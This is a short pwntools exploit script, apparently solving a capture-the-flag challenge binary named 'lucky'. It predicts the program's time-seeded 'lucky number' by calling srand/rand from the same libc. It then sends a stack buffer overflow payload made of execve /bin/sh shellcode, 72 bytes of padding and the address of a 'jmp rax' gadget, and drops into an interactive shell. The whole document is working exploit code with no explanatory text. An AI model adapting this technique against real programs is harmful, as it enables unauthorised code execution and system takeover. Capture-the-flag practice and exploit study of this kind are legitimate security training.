from pwn import *
import ctypes
import time

context.log_level = 'debug'

# Load the same libc used by the binary
libc = ctypes.CDLL('./challenge/src/libc.so.6')

# Calculate the current lucky number
current_time = int(time.time())
libc.srand(current_time)
predicted_number = libc.rand() % 1000

log.info(f"Predicted lucky number: {predicted_number}")

# Start the process
p = process('./challenge/src/lucky')
# p = remote("127.0.0.1", 8084)

p.recv()
p.sendline(str(predicted_number).encode())

shellcode = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"


payload = flat(
shellcode,
'A' * (72 - len(shellcode)),  # Padding to reach the return address
p64(0x000000000040110c) # Address of the jmp rax instruction that will jmp to the shellcode
)

p.sendline(payload)
p.interactive()
